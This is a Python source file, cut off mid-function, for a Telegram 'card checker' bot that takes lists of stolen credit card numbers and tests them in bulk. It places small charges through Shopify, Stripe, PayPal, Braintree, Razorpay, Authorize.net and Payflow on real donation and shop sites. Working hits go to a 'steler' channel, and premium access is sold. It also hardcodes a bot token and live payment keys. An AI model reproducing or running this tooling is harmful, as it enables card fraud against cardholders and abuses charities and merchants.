# storm_shopify_bot.py - Aiogram Version with Premium Emoji Buttons
import asyncio
import aiohttp
import aiofiles
import json
import os
import re
import random
import time
from datetime import datetime, timedelta
import string
import uuid
import warnings
from urllib.parse import urlparse
import requests
import base64
import traceback
from fake_useragent import UserAgent
from html import unescape
from curl_cffi import requests as cfrequests
from requests_toolbelt.multipart.encoder import MultipartEncoder

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, 
    InlineKeyboardButton, FSInputFile, BufferedInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

warnings.filterwarnings('ignore')

# ================== CONFIGURATION ==================
API_ID = 35384207
API_HASH = '09c4bc9de62a417ccdd0c69b33912515'
BOT_TOKEN = '8233170998:AAFUEY6Arhcre9Lck9cNyajSs8GUAA-o25Y'

# Owner & Groups
OWNER_ID = 8199994609
DEFAULT_GROUP_ID = -1003694167299
FREE_GROUP_ID = -1003694167299
BOT_NAME = "𝐅𝐫𝐨𝐱𝐭 𝑺𝒉𝒐𝒑𝒊𝒇𝒚"
BOT_NAME_STYLED = "𝐅𝐫𝐨𝐱𝐭 𝑺𝒉𝒐𝒑𝒊𝒇𝒚"

# Channel IDs
PRIVATE_STELER_CHANNEL_ID = -1003332800094
SEND_TO_PRIVATE_STELER = True
HIT_LOG_CHANNEL_ID = -1003771620838
SEND_HIT_TO_LOG = True

# Limits
MAX_CARDS = 5000
RAZORPAY_MASS_LIMIT = 15
PAYFLOW_MASS_LIMIT = 100
PAYPAL_MASS_LIMIT = 100
STRIPE5_MASS_LIMIT = 100
MAX_SITES_PER_UPLOAD = 150
FREE_GROUP_MAX_CARDS = 200

# Files
PREMIUM_FILE = 'premium.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
APPROVED_GROUPS_FILE = 'approved_groups.json'
GATEWAY_SETTINGS_FILE = 'gateway_settings.json'
API_SETTINGS_FILE = 'api_settings.json'
USERS_FILE = 'users.json'
FORWARD_QUEUE_FILE = 'forward_queue.json'
REDEEM_FILE = 'redeem_codes.json'
BANNED_FILE = 'banned_users.json'
STATS_FILE = 'user_stats.json'
FEEDBACK_FILE = 'feedback.json'

# APIs
PROXY_API_URL = 'http://76.13.78.203:5000/shopify'
PROXYLESS_API_1 = 'http://76.13.78.203:5000/shopify'
PROXYLESS_API_2 = 'https://web-production-9db0.up.railway.app/shopify'
PROXYLESS_SITES = [
    'https://touch-of-finland.myshopify.com',
    'https://charles-m-schulz-museum.myshopify.com'
]

AUTO_PAYPAL_SITES = [
    "https://hopelives365biblestudy.com/donate/",
    "https://awwatersheds.org/donate/"
]

PAYPAL_SITE = "https://www.rarediseasesinternational.org/donate/"
PAYPAL_AMOUNT = "1.00"
PAYPAL2_AMOUNT = "0.01"
PAYPAL2_SITE = "https://www.paypal.com/smart/card-fields"
STRIPE_AUTH_SITE = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
STRIPE_DONATION_URL = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/"
STRIPE_DONATION_KEY = "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH"
RAZORPAY_API_URL_OLD = "https://auto-razorpay-nano.vercel.app/hit"
RAZORPAY_API_URL_NEW = "https://wow-production-2c3a.up.railway.app/rz"
RAZORPAY_API_KEY = "aiojames"
RAZORPAY_SITES = ["https://pages.razorpay.com/payonline", "https://razorpay.me/@hial"]
RAZORPAY_AMOUNT = 1
STRIPE5_URL = "https://www.galaxie.com/subscribe/2"
STRIPE5_AMOUNT = "$5"
BRAINTREE_SITE_URL = "https://buckmans.com"
BRAINTREE_PRODUCT_URL = f"{BRAINTREE_SITE_URL}/product/stickers/45050/buckmans-shield-sticker"
BRAINTREE_CHECKOUT_URL = f"{BRAINTREE_SITE_URL}/store/checkout/index.aspx"
BRAINTREE_REVIEW_URL = f"{BRAINTREE_SITE_URL}/store/checkout/review-order.aspx"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
PAYFLOW_BASE_URL = "https://www.magnifier.com"
PAYFLOW_AMOUNT = "$18"
AUTHORIZE_SITE = "https://www.jetsschool.org"
AUTHORIZE_FORM_ID = "6913"
AUTHORIZE_API_LOGIN_ID = "93HEsxKeZ4D"
AUTHORIZE_CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
AUTHORIZE_MASS_LIMIT = 200
AUTHORIZE_MASS_WORKERS = 8
AUTHORIZE_AUTH_SITE = "https://morgannasalchemy.com"
AUTHORIZE_AUTH_LOGIN_URL = f"{AUTHORIZE_AUTH_SITE}/my-account/"
AUTHORIZE_AUTH_ADD_PAYMENT_URL = f"{AUTHORIZE_AUTH_SITE}/my-account/add-payment-method/"
AUTHORIZE_AUTH_MASS_LIMIT = 200
AUTHORIZE_AUTH_WORKERS = 8

# Workers
ERROR_SLEEP_SECONDS = 150
CARD_DELAY_SECONDS = 5
SHOPIFY_PROXY_WORKERS = 10
SHOPIFY_PROXYLESS_WORKERS = 10
STRIPE_MASS_WORKERS = 4
STRIPE5_PROXY_WORKERS = 10
STRIPE5_PROXYLESS_WORKERS = 1
PAYPAL_MASS_WORKERS = 8
PAYFLOW_PROXY_WORKERS = 8
PAYFLOW_PROXYLESS_WORKERS = 1
RAZORPAY_MASS_WORKERS = 5

# ================== LIVE EMOJIS ==================
LIVE_EMOJIS = {
    "storm": '<tg-emoji emoji-id="5042334757040423886">⚡</tg-emoji>',
    "crown": '<tg-emoji emoji-id="5229011542011299168">👑</tg-emoji>',
    "star": '<tg-emoji emoji-id="5983292843836314861">⭐</tg-emoji>',
    "rocket": '<tg-emoji emoji-id="5195033767969839232">🚀</tg-emoji>',
    "fire": '<tg-emoji emoji-id="5983168105101135589">🔥</tg-emoji>',
    "shield": '<tg-emoji emoji-id="5278394972901492572">🛡️</tg-emoji>',
    "lock": '<tg-emoji emoji-id="5429405838345265327">🔒</tg-emoji>',
    "unlock": '<tg-emoji emoji-id="5372957680174384345">🔓</tg-emoji>',
    "check": '<tg-emoji emoji-id="5278622189556354905">✔️</tg-emoji>',
    "cross": '<tg-emoji emoji-id="6325599637088503604">❌</tg-emoji>',
    "warning": '<tg-emoji emoji-id="5462882007451185227">⚠️</tg-emoji>',
    "info": '<tg-emoji emoji-id="6100619775426173201">ℹ️</tg-emoji>',
    "back": '<tg-emoji emoji-id="5253997076169115797">🔙</tg-emoji>',
    "gate": '<tg-emoji emoji-id="5463172695132745432">🏰</tg-emoji>',
    "sword": '<tg-emoji emoji-id="5413554170668032766">⚔️</tg-emoji>',
    "medal": '<tg-emoji emoji-id="5039727497143387500">🏅</tg-emoji>',
    "user": '<tg-emoji emoji-id="5958417144877160497">👤</tg-emoji>',
    "plan": '<tg-emoji emoji-id="5463172695132745432">📦</tg-emoji>',
    "tools": '<tg-emoji emoji-id="5040030395416969985">🛠️</tg-emoji>',
    "close": '<tg-emoji emoji-id="5040042498634810056">❌</tg-emoji>',
    "stats": '<tg-emoji emoji-id="5278654126933166502">📊</tg-emoji>',
    "key": '<tg-emoji emoji-id="5980797575211520457">🔑</tg-emoji>',
    "clock": '<tg-emoji emoji-id="5971837723676249096">⏰</tg-emoji>',
    "link": '<tg-emoji emoji-id="5447410659077661506">🔗</tg-emoji>',
    "proxy": '<tg-emoji emoji-id="6098031288831187632">🌐</tg-emoji>',
}

PREMIUM_EMOJI_IDS = {
    "✅": "5980797575211520457", "🔥": "5983168105101135589", "❌": "5042112436648281096",
    "⚡": "6026367225466720832", "💳": "5445353829304387411", "💠": "6136204644625423818",
    "📝": "6136389654636665179", "🌐": "5447410659077661506", "🎯": "5463274047771000031",
    "🤖": "6181581124431518331", "💰": "5463046637842608206", "⏸️": "5359543311897998264",
    "▶️": "5348125953090403204", "🛑": "5454380420336466255", "📊": "5278654126933166502",
    "📦": "5463172695132745432", "📋": "5197269100878907942", "🔄": "5926964914684957537",
    "⏳": "5971837723676249096", "🚀": "5195033767969839232", "⚠️": "6136281850957535879",
    "💎": "5280922999241859582", "🔍": "6098031288831187632", "📢": "5298609030321691620",
    "⭐️": "5278362086336908780", "✨": "5041992177563993101", "⌛": "5971837723676249096",
    "💵": "5453901475648390219", "✔️": "6169954746745492343", "👀": "5309969008366201019",
    "🎉": "5361813133394457682", "⚡️": "6026367225466720832", "🫦": "5276448712766266718",
    "🚫": "5462882007451185227",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

def get_live_emoji(key):
    return LIVE_EMOJIS.get(key, "")

def bold_text(text):
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
        'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
        'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭', 'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱',
        'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻',
        'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅',
        'y': '𝘆', 'z': '𝘇', '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳',
        '8': '𝟴', '9': '𝟵', '!': '!', '?': '?', '.': '.', ',': ',', '-': '-', '_': '_', ' ': ' ', ':': ':', '/': '/', '|': '|'
    }
    return ''.join(bold_map.get(c, c) for c in text)

# ================== AIOGRAM BUTTON HELPER ==================
class Button:
    @staticmethod
    def inline(text, callback_data, style="primary", icon=None):
        """
        Create an inline button with style and icon.
        
        Styles: "primary", "secondary", "success", "danger", "warning", "purple", "orange", "pink"
        
        Example:
            Button.inline("BIN Lookup", "menu_bin", style="primary", icon=PREMIUM_EMOJI_IDS["🔍"])
        """
        styles = {
            "primary": "🔵", "secondary": "⚪", "success": "🟢",
            "danger": "🔴", "warning": "🟡", "purple": "🟣",
            "orange": "🟠", "pink": "🌸"
        }
        button_text = text
        if icon:
            # If icon is a premium emoji ID, use it as a custom emoji
            if isinstance(icon, str) and icon in PREMIUM_EMOJI_IDS.values():
                # Get the emoji character from the ID
                for emoji_char, emoji_id in PREMIUM_EMOJI_IDS.items():
                    if emoji_id == icon:
                        button_text = f"{emoji_char} {text}"
                        break
            else:
                # If icon is a regular emoji
                button_text = f"{icon} {text}"
        # Add style indicator
        style_emoji = styles.get(style, "🔵")
        # Add colored dot before the text
        button_text = f"{style_emoji} {button_text}"
        return InlineKeyboardButton(text=button_text, callback_data=callback_data)

# ================== FILE HELPERS ==================
def load_json(file, default=None):
    if default is None:
        default = {}
    if not os.path.exists(file):
        return default
    try:
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

async def load_json_async(filename):
    try:
        if not os.path.exists(filename):
            return {}
        async with aiofiles.open(filename, "r", encoding='utf-8') as f:
            return json.loads(await f.read())
    except:
        return {}

async def save_json_async(filename, data):
    try:
        async with aiofiles.open(filename, "w", encoding='utf-8') as f:
            await f.write(json.dumps(data, indent=4))
    except:
        pass

# ================== USER & PREMIUM MANAGEMENT ==================
def load_premium_users():
    data = load_json(PREMIUM_FILE, {})
    now = time.time()
    expired = [uid for uid, exp in data.items() if exp <= now]
    for uid in expired:
        del data[uid]
    if expired:
        save_json(PREMIUM_FILE, data)
    return data

def is_premium(user_id):
    data = load_premium_users()
    exp = data.get(str(user_id))
    return exp is not None and exp > time.time()

async def is_premium_user(user_id):
    return is_premium(user_id)

async def add_premium_user(user_id, days, plan_name="Premium"):
    premium = load_json(PREMIUM_FILE, {})
    expiry = time.time() + days * 86400
    premium[str(user_id)] = expiry
    save_json(PREMIUM_FILE, premium)

def load_approved_groups():
    return load_json(APPROVED_GROUPS_FILE, [DEFAULT_GROUP_ID])

def save_approved_groups(groups):
    save_json(APPROVED_GROUPS_FILE, groups)

def is_group_approved(group_id):
    return group_id in load_approved_groups()

def load_gateway_settings():
    default = {
        "shopify": {"enabled": True, "single": True, "mass": True},
        "paypal": {"enabled": True, "single": True, "mass": False},
        "paypal2": {"enabled": True, "single": True, "mass": False},
        "stripe_auth": {"enabled": True, "single": True, "mass": True},
        "stripe_donation": {"enabled": True, "single": True, "mass": False},
        "razorpay": {"enabled": True, "single": True, "mass": True},
        "stripe5": {"enabled": True, "single": True, "mass": True},
        "braintree": {"enabled": True, "single": True, "mass": False},
        "payflow": {"enabled": True, "single": True, "mass": True},
    }
    return load_json(GATEWAY_SETTINGS_FILE, default)

def save_gateway_settings(settings):
    save_json(GATEWAY_SETTINGS_FILE, settings)

def load_api_settings():
    default = {
        "shopify_proxyless_apis": [PROXYLESS_API_1, PROXYLESS_API_2],
        "shopify_proxyless_sites": PROXYLESS_SITES
    }
    return load_json(API_SETTINGS_FILE, default)

def save_api_settings(settings):
    save_json(API_SETTINGS_FILE, settings)

def add_user_for_broadcast(user_id):
    users = load_json(USERS_FILE, [])
    if user_id not in users:
        users.append(user_id)
        save_json(USERS_FILE, users)

def load_sites():
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def save_proxies(proxies):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in proxies:
            f.write(f"{p}\n")

async def is_banned_user(user_id):
    banned = await load_json_async(BANNED_FILE)
    return str(user_id) in banned

async def get_user_stats(user_id):
    stats = await load_json_async(STATS_FILE)
    return stats.get(str(user_id), {"checked": 0, "charged": 0, "approved": 0, "declined": 0})

def proxy_str_to_dict(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        user_pass = f"{parts[2]}:{parts[3]}"
        proxy_url = f"http://{user_pass}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    return None

# ================== CC PARSER ==================
def extract_cc_from_text(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    match = re.search(r'(\d{15,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})', text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    match = re.search(r'(\d{15,16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3,4})', text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    return None

def parse_cc(cc_str):
    parts = cc_str.split('|')
    if len(parts) >= 4:
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yy) == 2:
            yy = "20" + yy
        return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_cc_from_text(line)
        if card:
            cards.add(card)
    return list(cards)

# ================== INITIALIZE BOT ==================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ================== KEYBOARD BUILDERS ==================
def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("GATES", "gates_menu", style="primary", icon=PREMIUM_EMOJI_IDS.get("🏰", "🏰")),
            Button.inline("ACCOUNT", "account_menu", style="purple", icon=PREMIUM_EMOJI_IDS.get("👤", "👤")),
            Button.inline("TOOLS", "tools_menu", style="orange", icon=PREMIUM_EMOJI_IDS.get("🛠️", "🛠️")),
        ],
        [
            Button.inline("PLANS", "plans_menu", style="success", icon=PREMIUM_EMOJI_IDS.get("📦", "📦")),
            Button.inline("CLOSE", "close_menu", style="danger", icon=PREMIUM_EMOJI_IDS.get("❌", "❌")),
        ]
    ])

def get_gates_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("AUTH", "auth_menu", style="purple", icon=PREMIUM_EMOJI_IDS.get("🛡️", "🛡️")),
            Button.inline("CHARGE", "charge_menu", style="danger", icon=PREMIUM_EMOJI_IDS.get("⚡", "⚡")),
        ],
        [
            Button.inline("BACK", "back_main", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_auth_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("STRIPE AUTH", "stripe_auth_menu", style="primary", icon=PREMIUM_EMOJI_IDS.get("💳", "💳")),
            Button.inline("BRAINTREE", "braintree_menu", style="purple", icon=PREMIUM_EMOJI_IDS.get("🏦", "🏦")),
        ],
        [
            Button.inline("BACK", "gates_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_stripe_auth_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("SINGLE", "stripe_auth_single", style="success", icon=PREMIUM_EMOJI_IDS.get("🔍", "🔍")),
            Button.inline("MASS", "stripe_auth_mass", style="orange", icon=PREMIUM_EMOJI_IDS.get("📊", "📊")),
        ],
        [
            Button.inline("BACK", "auth_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_braintree_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("SINGLE", "braintree_single", style="success", icon=PREMIUM_EMOJI_IDS.get("🔍", "🔍")),
        ],
        [
            Button.inline("BACK", "auth_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_charge_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("SHOPIFY", "shopify_menu", style="primary", icon=PREMIUM_EMOJI_IDS.get("🛍️", "🛍️")),
            Button.inline("RAZORPAY", "razorpay_menu", style="purple", icon=PREMIUM_EMOJI_IDS.get("🇮🇳", "🇮🇳")),
            Button.inline("PAYPAL $1", "paypal_1", style="success", icon=PREMIUM_EMOJI_IDS.get("💵", "💵")),
        ],
        [
            Button.inline("PAYPAL $0.01", "paypal_01", style="warning", icon=PREMIUM_EMOJI_IDS.get("🪙", "🪙")),
            Button.inline("STRIPE $5", "stripe_5", style="orange", icon=PREMIUM_EMOJI_IDS.get("💰", "💰")),
            Button.inline("DONATION", "donation", style="danger", icon=PREMIUM_EMOJI_IDS.get("❤️", "❤️")),
        ],
        [
            Button.inline("PAYFLOW", "payflow", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🌊", "🌊")),
            Button.inline("AUTHORIZE", "authorize", style="purple", icon=PREMIUM_EMOJI_IDS.get("🏛️", "🏛️")),
            Button.inline("AUTHORIZE AUTH", "authorize_auth", style="pink", icon=PREMIUM_EMOJI_IDS.get("🔐", "🔐")),
        ],
        [
            Button.inline("BACK", "gates_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_shopify_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("SINGLE", "shopify_single", style="success", icon=PREMIUM_EMOJI_IDS.get("🔍", "🔍")),
            Button.inline("MASS", "shopify_mass", style="orange", icon=PREMIUM_EMOJI_IDS.get("📊", "📊")),
        ],
        [
            Button.inline("BACK", "charge_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_razorpay_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("SINGLE", "razorpay_single", style="success", icon=PREMIUM_EMOJI_IDS.get("🔍", "🔍")),
            Button.inline("MASS", "razorpay_mass", style="orange", icon=PREMIUM_EMOJI_IDS.get("📊", "📊")),
        ],
        [
            Button.inline("BACK", "charge_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_account_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("PROFILE", "profile_info", style="primary", icon=PREMIUM_EMOJI_IDS.get("👤", "👤")),
            Button.inline("PLANS", "plans_menu", style="success", icon=PREMIUM_EMOJI_IDS.get("📦", "📦")),
            Button.inline("REDEEM", "redeem_menu", style="warning", icon=PREMIUM_EMOJI_IDS.get("🔑", "🔑")),
        ],
        [
            Button.inline("BACK", "back_main", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_tools_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("PROXY", "proxy_menu", style="primary", icon=PREMIUM_EMOJI_IDS.get("🌐", "🌐")),
            Button.inline("SITES", "sites_menu", style="success", icon=PREMIUM_EMOJI_IDS.get("🌍", "🌍")),
            Button.inline("BROADCAST", "broadcast_menu", style="danger", icon=PREMIUM_EMOJI_IDS.get("📢", "📢")),
        ],
        [
            Button.inline("BACK", "back_main", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_proxy_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("ADD PROXY", "add_proxy", style="success", icon=PREMIUM_EMOJI_IDS.get("➕", "➕")),
            Button.inline("VIEW PROXY", "view_proxy", style="primary", icon=PREMIUM_EMOJI_IDS.get("👁️", "👁️")),
            Button.inline("REMOVE PROXY", "remove_proxy", style="danger", icon=PREMIUM_EMOJI_IDS.get("➖", "➖")),
        ],
        [
            Button.inline("BACK", "tools_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_sites_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("ADD SITES", "add_sites", style="success", icon=PREMIUM_EMOJI_IDS.get("➕", "➕")),
            Button.inline("VIEW SITES", "view_sites", style="primary", icon=PREMIUM_EMOJI_IDS.get("👁️", "👁️")),
            Button.inline("REMOVE SITES", "remove_sites", style="danger", icon=PREMIUM_EMOJI_IDS.get("➖", "➖")),
        ],
        [
            Button.inline("BACK", "tools_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

def get_plans_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            Button.inline("1 DAY - ₹20", "plan_1day", style="primary", icon=PREMIUM_EMOJI_IDS.get("📅", "📅")),
            Button.inline("1 WEEK - ₹100", "plan_1week", style="success", icon=PREMIUM_EMOJI_IDS.get("📆", "📆")),
        ],
        [
            Button.inline("1 MONTH - ₹300", "plan_1month", style="purple", icon=PREMIUM_EMOJI_IDS.get("📅", "📅")),
            Button.inline("2 MONTH - ₹550", "plan_2month", style="orange", icon=PREMIUM_EMOJI_IDS.get("📆", "📆")),
        ],
        [
            Button.inline("BACK", "account_menu", style="secondary", icon=PREMIUM_EMOJI_IDS.get("🔙", "🔙")),
        ]
    ])

# ================== BIN INFO ==================
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except:
        return '-', '-', '-', '-', '-', ''

# ================== SHOPIFY CHECKER ==================
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out', 'access denied',
    'tlsv1 alert', 'ssl routines', 'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect', 'empty reply from server',
    'httperror504', 'http error', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout',
    'network error', 'connection reset', 'failed to detect product',
    'failed to create checkout', 'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail', 'site error',
    'status: 429', '429', 'could not resolve', 'connection refused', 'empty reply', 'bad gateway',
    'service unavailable', 'site not supported', 'no valid products found',
    'proxy error', 'cannot connect to host', 'not a shopify Site', ' not Shopify site', 'Site requires login!'
)

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def check_card_shopify(card, site, proxy, use_proxy_api, use_random_sites=False):
    import os
    os.environ.pop('HTTP_PROXY', None)
    os.environ.pop('HTTPS_PROXY', None)
    os.environ.pop('http_proxy', None)
    os.environ.pop('https_proxy', None)
    os.environ['NO_PROXY'] = '*'

    try:
        if use_proxy_api:
            if not proxy:
                return {'status': 'Site Error', 'message': 'Proxy required', 'card': card, 'retry': False}
            from urllib.parse import quote
            params = {'cc': card, 'site': site, 'proxy': quote(proxy, safe='')}
            timeout = aiohttp.ClientTimeout(total=120)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(PROXY_API_URL, params=params) as resp:
                    raw = await resp.json(content_type=None)
            response_msg = raw.get('Response', '')
            price = raw.get('Price', '-')
            gate = raw.get('Gate', 'shopiii')
            status = raw.get('Status', '')
        else:
            import requests
            from urllib.parse import quote
            api_settings = load_api_settings()
            apis = api_settings.get('shopify_proxyless_apis', [PROXYLESS_API_1, PROXYLESS_API_2])

            if use_random_sites:
                sites = load_sites()
                if not sites:
                    return {'status': 'Site Error', 'message': 'No sites available', 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
                unique_sites = list(dict.fromkeys(sites))
                random.shuffle(unique_sites)
                sites_list = unique_sites[:min(5, len(unique_sites))]
                if not sites_list:
                    return {'status': 'Site Error', 'message': 'No sites available', 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
            else:
                sites_list = api_settings.get('shopify_proxyless_sites', PROXYLESS_SITES)

            last_error = None
            response_msg = ''
            price = '-'
            gate = 'shopiii'
            status = False
            chosen_site = None

            def call_api(api_url, site_url, card_str):
                encoded_card = quote(card_str, safe='')
                if api_url == PROXYLESS_API_1:
                    full_url = f"{api_url}?site={site_url}&cc={encoded_card}"
                else:
                    full_url = f"{api_url}?cc={encoded_card}&site={site_url}"
                sess = requests.Session()
                sess.trust_env = False
                sess.proxies = {"http": None, "https": None}
                resp = sess.get(full_url, timeout=60, verify=False)
                if resp.status_code != 200:
                    return None
                return resp.json()

            for site_url in sites_list:
                for api_url in apis:
                    try:
                        loop = asyncio.get_event_loop()
                        raw = await loop.run_in_executor(None, call_api, api_url, site_url, card)
                        if raw is None:
                            continue
                        response_msg = raw.get('Response', '')
                        price = raw.get('Price', '-')
                        gate = raw.get('Gateway', 'shopiii')
                        status = raw.get('Status', False)
                        last_error = None
                        chosen_site = site_url
                        break
                    except Exception as e:
                        last_error = str(e)
                        continue
                if last_error is None:
                    break
            else:
                error = last_error or 'All APIs/sites failed'
                return {'status': 'Site Error', 'message': error, 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
            site = chosen_site

        if not response_msg and status is None:
            response_msg = "API returned empty response"
        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()
        status_lower = str(status).lower()

        if status == 'Charged' or 'order completed' in response_lower or 'order_placed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if status == 'Approved' or any(key in response_lower for key in [
